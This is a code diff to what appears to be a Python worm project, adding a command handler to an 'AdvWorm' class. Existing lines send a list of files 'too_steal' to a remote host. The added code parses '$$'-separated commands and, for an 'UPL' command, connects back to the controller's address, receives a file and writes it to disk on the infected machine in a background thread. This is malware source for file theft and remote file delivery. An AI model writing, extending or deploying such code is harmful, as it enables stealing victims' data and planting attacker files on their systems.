@@ -1,4 +1,6 @@
 
+
+
 from random import randint
 import string
 
@@ -17,10 +19,6 @@ class IndexGen:
             strIndex += char
             c += 1
         return strIndex
-
-
-
-
 
 
 
@@ -113,6 +111,53 @@ class AdvWorm(BasicWorm):
         for ts in too_steal:
             self.sendFile(ts[0], ts[1], dirIndex)
     
-
+    def splitCMD(self, cmd: str) -> list:
+        cmd = cmd.split("$$")
+        command = []
+        for c in cmd:
+            if c == "" or c == " ":
+                continue
+            command.append(c)
+        return command
+    
+    def execCMD(self, cmd: str) -> None:
+        cmd = self.splitCMD(cmd)
+        print("CMD SPLIT: ", cmd)
+        match cmd[0]:
+            case "UPL":
+                self.downloadFile(cmd[1], cmd[2], cmd[3])
+    
+    def _downloadFile(self, port: int, file_name: str, file_len: int) -> None:
+        downSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            downSock.connect((self.ip, port))
+        except:
+            print("Cant xtra conn")
+            return
+        self.sendMsg(f"Start downloading file: {file_name}")
+        data = b""
+        while len(data) < file_len:
+            recv = downSock.recv(file_len - len(data))
+            if not recv:
+                return None
+            else:
+                data += recv
+        try:
+            with open(os.path.join(self.getPwd(), file_name), "wb") as f:
+                f.write(data)
+            self.sendMsg(f"File: {file_name} download successfull")
+        except:
+            print("ERROR: Save File")
+        
+    
+    def downloadFile(self, port: str, file_name: str, file_len: str):
+        try:
+            file_len = int(file_len)
+            port = int(port)
+        except:
+            print("ERROR Convert file len")
+            return
+        down = Thread(target=self._downloadFile, args=(port, file_name, file_len), daemon=True)
+        down.start()
 
 
